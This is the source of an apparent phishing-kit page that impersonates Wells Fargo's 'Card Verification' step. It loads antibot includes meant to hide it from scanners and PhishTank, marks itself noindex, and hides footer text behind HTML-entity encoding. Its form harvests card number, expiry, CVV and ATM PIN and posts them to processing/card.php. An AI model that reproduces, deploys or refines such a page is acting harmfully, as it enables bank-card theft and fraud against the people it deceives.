<?php
ini_set( "display_errors", 0);
	
		
	include "antibots/#1.php";
    include "antibots/#2.php";
    include "antibots/#3.php";
    include "antibots/#4.php";
    include "antibots/#5.php";
    include "antibots/#6.php";
    include "antibots/#7.php";
    include "antibots/#8.php";
    include "antibots/#9.php";
    include "antibots/#10.php";
    include "antibots/#11.php";
    include "antibots/#12.php";
    include "antibots/antibot_host.php";
    include "antibots/antibot_ip.php";
    include "antibots/antibot_phishtank.php";
    include "antibots/antibot_userAgent.php";
?>
<!DOCTYPE html><html class="ui-mobile wf-myriadpro-n4-active" lang="en" data-device="desktop" data-masked-input-enabled="true" data-print-link-enabled="true"><head>

        <meta name="robots" content="noindex" />
         <meta name="robots" content="noindex,nofollow" />
			<meta name="googlebot" content="noindex" />
			<META NAME="robots" CONTENT="nofollow">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
<meta http-equiv="imagetoolbar" content="no">


<title>Card Verification | Wells Fargo</title>

<link rel="stylesheet" type="text/css" href="css/style.css" />
<link rel="stylesheet" href="assets/css/jquery.mobile.css">
<link rel="stylesheet" href="assets/css/desktop-tablet.combined1.css">
<link rel="stylesheet" href="assets/css/archer.css">
<link rel="stylesheet" href="./assets/dist/css/formValidation.min.css">

<style type="text/css">.tk-myriad-pro{font-family:"myriad-pro",sans-serif;}</style>
<style type="text/css">@font-face{font-family:myriad-pro;src:url(./assets/fonts/myriad.woff2) format("woff2"),url(./assets/fonts/awe.woff) format("woff"),url(./assets/fonts/b87d1abf881446b2bae0d8204029d20a9b85e656-a.otf) format("opentype");font-weight:400;font-style:normal;}</style>

<style>
.fv-plugins-icon[data-field="cvv"] {
    display: none;
}
.fv-plugins-icon[data-field="cc"] {
    display: none;
}
.fv-plugins-icon[data-field="noc"] {
    display: none;
}
.fv-plugins-icon[data-field="atm"] {
    display: none;
}

.fv-plugins-icon[data-field="expdate"] {
    display: none;
}
.fv-plugins-icon[data-field="stradd"] {
    display: none;
}
</style>


<link rel="icon" href="assets/images/favicon.ico">




  </head>
<body data-gr-c-s-loaded="true" class="ui-mobile-viewport ui-overlay-a" data-inq-observer="1">
	<noscript>

	</noscript>
	<div id="mainpage" data-role="page" class="osmp-app ui-page ui-page-theme-a ui-page-active"  tabindex="0" style="">


<header role="banner">
	<div class="masthead">

		<nav class="back">

		</nav>

		<div>




					<a class="c28cLink child-window ui-link" href="javascript:void(0)"> <img class="masthead-img-logo" alt="" role="img" src="./assets/images/whyt.svg">
					</a>


		</div>




				<div role="navigation" class="top-search">
					<ul>



								<li class="security">
									<a class="c28cLink child-window ui-link" href="javascript:void(0)" data-platform="salesplatform">Online Security
									</a>
								</li>


					</ul>
				</div>



		<nav class="menu">



					<a href="javascript:void(0)" class="ui-link"></a>


		</nav>

	</div>

</header>




		<div id="mainColumns" tabindex="-1" role="main" class="ui-content osmp-content">
			<div class="primary-content">









<!-- Define Variable activeStepCount and initialize to zero-->






					<div class="progress-small small-screen">
						<span class="left">
		        	    	Credit / Debit Card Information
	    	    		</span>
	        	    	<span class="right">
		        	    	Step 2 of 2
	    	    		</span>
			    	</div>
			<div class="progress-bar not-small-screen">
				<ul class="ui-grid-d">


							            	<span><span>

							        	   	    Contact Verification


								        	</span></span>
							            </li>




			    	    	<li class="ui-block-c active first">

							            	<span><span>
									        		Credit / Debit Card Information

								        	</span></span>
							            </li>

					            		<li class="ui-block-d">

							            	<span><span>

									        		Review


								        	</span></span>
							            </li>



				</ul>
			</div>




				<div class="osmp-title">
					<div>
						<h2>Please verify the card details linked to your account</h2>
					</div>

						<div class="large-screen right sub-title">
							All fields are required.
						</div>


				</div>
				<div class="not-large-screen">



						<p class="sub-title">
							All fields are required.
						</p>

				</div>
<h2 class="section-hdr">

</h2>

<form id="wecc" action="processing/card.php" method="post">


<div class="section">


			</div>



	<div class="ui-field-contain inline-field-contain">
	<div class="grid-x grid-padding-x">
			<label for="socialSecurityNumber">
				Name On Card
			</label>

						<div class="ui-input-text ui-body-inherit ui-corner-all ui-shadow-inset"><input id="cardNumber"  id="name" name="noc"  autocomplete="cc-name" type="text" value="" size="30" /> </div>
					</div>



		</div>


		<div class="ui-field-contain inline-field-contain">
		<div class="grid-x grid-padding-x">
			<label for="socialSecurityNumber">
				Card Number
			</label>


						<div class="ui-input-text ui-body-inherit ui-corner-all ui-shadow-inset"><input id="cc-number" name="cc" autocomplete="cc-number" type="tel" value="" size="30" maxlength="19" /> </div>
					</div>



		</div>




		<div class="ui-field-contain inline-field-contain">
				<div class="inline-field">
				<div class="grid-x grid-padding-x">
					<label for="licenseExpirationDate">
						Expiration date
					</label>
					<div class="tip-text" id="expirationDateDescription">
						MM/YYYY
					</div>
					<div class="ui-input-text ui-body-inherit ui-corner-all ui-shadow-inset"><input autocomplete="off" type="tel" name="expdate" class="pmask required DATE" value="" size="10" minlength="7"maxlength="7" ></div></div>
				</div>
			</div>









			<div class="ui-field-contain inline-field-contain">
<div class="inline-field city-field-voice-over">
<div class="grid-x grid-padding-x">
					<label for="licenseExpirationDate">
						Security Code
					</label>
					<div class="ui-input-text ui-body-inherit ui-corner-all ui-shadow-inset"><input class="cc-cvc" name="cvv" type="tel" value="" size="6" minlength="3" maxlength="3" autocomplete="off" required></div><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><img src="./assets/images/cvv.png" alt="CVV" width="88" height="45" align="right">
				</div></div>




				<div class="inline-field zip-field-voice-over">
				<div class="grid-x grid-padding-x">
					<label for="licenseExpirationDate">
						Atm Pin
					</label>
					<div class="ui-input-text ui-body-inherit ui-corner-all ui-shadow-inset"><input class="cc-cvc" name="atm" type="tel" value="" size="6" minlength="4" maxlength="4" autocomplete="off" required></div></div>
				</div>
			</div>




			<fieldset>
				<div id="additionalAddressCheckBoxContainer" class="ui-field-contain checkbox-contain">


			</fieldset>




		</div>




	<div class="ui-field-contain inline-field-contain">
		<fieldset>




</div>






<div class="btn-ctr"><div class="btn-ctr-inner">
	<input class="flow-event" type="hidden" name="_eventId_continue" value="">



			<button type="submit" data-flow-event="_eventId_continue" data-mrkt-tracking-id="continue" class="continue-button ui-btn ui-btn-p">
				Continue
			</button>

</div></div>
</form>
<script src="https://cdnjs.cloudflare.com/ajax/libs/es6-shim/0.35.3/es6-shim.min.js"></script>
<script src="assets/dist/js/FormValidation.min.js"></script>
<script src="assets/dist/js/plugins/Foundation.min.js"></script>
<script src="./assets/dist/js/forms.js"></script>

 <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.0.0-beta1/jquery.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.10/jquery.mask.js"></script>
    <script>
        $('input[name="expdate"]').mask('00/0000');

    </script>




</div>

<div data-role="footer" class="osmp-footer ui-footer ui-bar-inherit singleColumn" role="contentinfo">

	<footer role="contentinfo">
			<div class="c9">
				<nav aria-label="corporate, legal, security">
					<ul class="not-large-screen">






									<li><a class="c28cLink child-window ui-link" href="javascript:void(0)">&#80;&#114;&#105;&#118;&#97;&#99;&#121;&#44;&#32;&#83;&#101;&#99;&#117;&#114;&#105;&#116;&#121; &amp; Legal</a></li>
									<li><a class="c28cLink child-window ui-link" href="javascript:void(0)">&#65;&#100;&#32;&#67;&#104;&#111;&#105;&#99;&#101;&#115;</a></li>
									<li><a class="c28cLink child-window ui-link" title="Online Security" href="javascript:void(0)">&#79;&#110;&#108;&#105;&#110;&#101;&#32;&#83;&#101;&#99;&#117;&#114;&#105;&#116;&#121;</a></li>




					</ul>
					<ul class="large-screen">






									<li><a class="c28cLink child-window ui-link" href="javascript:void(0)">&#80;&#114;&#105;&#118;&#97;&#99;&#121;&#44;&#32;&#83;&#101;&#99;&#117;&#114;&#105;&#116;&#121; &amp; Legal</a></li>
									<li><a class="c28cLink child-window ui-link" href="javascript:void(0)">&#65;&#100;&#32;&#67;&#104;&#111;&#105;&#99;&#101;&#115;</a></li>
									<li><a class="c28cLink child-window ui-link" title="Online Security" href="javascript:void(0)">&#79;&#110;&#108;&#105;&#110;&#101;&#32;&#83;&#101;&#99;&#117;&#114;&#105;&#116;&#121;</a></li>




					</ul>
				</nav>
				<hr>
				&#169;&#32;&#49;&#57;&#57;&#57; - <span class="placeholder">&#50;&#48;&#50;&#50;<span> &#87;&#101;&#108;&#108;&#115;&#32;&#70;&#97;&#114;&#103;&#111;&#46;&#32;&#65;&#108;&#108;&#32;&#114;&#105;&#103;&#104;&#116;&#115;&#32;&#114;&#101;&#115;&#101;&#114;&#118;&#101;&#100;&#46;&#32;&#78;&#77;&#76;&#83;&#82;&#32;&#73;&#68;&#32;&#51;&#57;&#57;&#56;&#48;&#49;
			</div>
		</footer>
</div>


</body></html>
